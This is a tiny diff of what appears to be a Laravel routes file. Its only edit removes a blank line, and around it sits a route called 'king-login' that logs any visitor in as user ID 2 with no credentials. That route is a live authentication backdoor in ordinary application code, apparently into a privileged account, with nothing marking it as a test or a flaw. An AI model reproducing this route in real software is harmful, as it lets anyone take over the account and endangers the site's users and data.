@@ -1,7 +1,6 @@
 <?php
 Route::get('king-login' , function(){
   Auth::loginUsingId(2);
-
 });
 Route::get('change-lang/{lang}' , 'FrontEndController@ChangeLanguage')->name('changeLang');
 //Admin Routes
